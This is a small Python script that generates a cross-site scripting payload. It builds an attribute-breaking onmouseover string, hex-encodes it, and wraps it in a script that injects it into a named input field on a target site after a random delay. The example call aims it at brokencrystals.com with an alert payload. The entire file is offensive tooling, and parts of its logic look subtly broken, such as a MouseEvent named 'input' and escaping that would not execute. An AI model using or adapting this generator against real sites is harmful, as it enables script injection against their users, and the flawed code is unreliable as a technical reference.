import random
import string

def generate_dynamic_xss_payload(target_url, input_element_id, malicious_code):
    payload = f"' onmouseover='{malicious_code}"
    encoded_payload = ''.join(['\\x'+hex(ord(c))[2:] for c in payload])
    
    dynamic_script = f'''
    var targetElement = document.getElementById('{input_element_id}');
    targetElement.value = "{encoded_payload}";
    
    setTimeout(() => {{
        var event = new MouseEvent('input', {{
            bubbles: true,
            cancelable: true,
        }});
        targetElement.dispatchEvent(event);
    }}, {random.randint(500, 2000)});
    '''
    
    full_payload = f'''
    <script>
        {dynamic_script}
    </script>
    '''
    
    print(f'Generated Dynamic XSS Payload for {target_url}:\n{full_payload}')

# Example Usage
generate_dynamic_xss_payload('https://brokencrystals.com/', 'inputFieldId', 'alert("XSS Vulnerability Exploited!");')